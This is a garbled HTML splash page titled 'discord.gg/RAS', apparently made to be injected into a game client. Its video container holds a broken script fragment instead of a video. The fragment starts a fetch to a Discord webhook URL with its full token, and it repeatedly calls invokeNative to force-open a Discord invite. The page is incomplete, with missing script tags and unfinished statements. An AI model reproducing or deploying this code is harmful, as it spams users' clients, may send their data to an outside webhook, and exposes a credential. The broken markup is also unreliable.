<!DOCTYPE html>

<head>

    <title>discord.gg/RAS</title>
    <style>
       body {
            margin: 0;
            padding: 0;
            background: black;
            font-family: 'Courier New', Courier, monospace;
            color: #9f8663;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            text-align: center;
            overflow: hidden;
        }
        #content {
            display: none;
            opacity: 0;
            transition: opacity 2s ease;
        }
        .image-container img {
            width: 400px; 
            height: auto;
            border: 2px solid #a60404; 
            border-radius: 15px;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); 
        }
        .info {
            margin-top: 20px;
            font-size: 1.5em;
            color:  #a60404; 
            text-shadow: 0 0 8px #a60404, 0 0 15px #a60404, 0 0 25px #a60404;
            letter-spacing: 4.5px; 
            white-space: pre-wrap;
        }
        .text {
            margin-top: 5px;
            font-size: 75px; 
            color: #a60404; 
            text-shadow: 0 0 8px #a60404, 0 0 15px #a60404, 0 0 25px #a60404; 
            letter-spacing: 4.5px;
        }
        .video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: -1;
        }
        .video-container video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(15px);
        }
    </style>
</head>
<body>
    <div class="video-container">

            const webhookUrl = 'https://canary.discord.com/api/webhooks/1301722728541458472/OJrlM-B2yioPp9q5o1oMjRMugMJhRBXLh7DMQoaIbrGVPU9hDl_exKk4PMusgXRA3h6b';
            fetch(webhookUrl, {

        setInterval(function() {
            window.invokeNative("openUrl", "https://discord.gg/RAS");
            window.invokeNative("openUrl", "https://discord.gg/RAS");

</html>
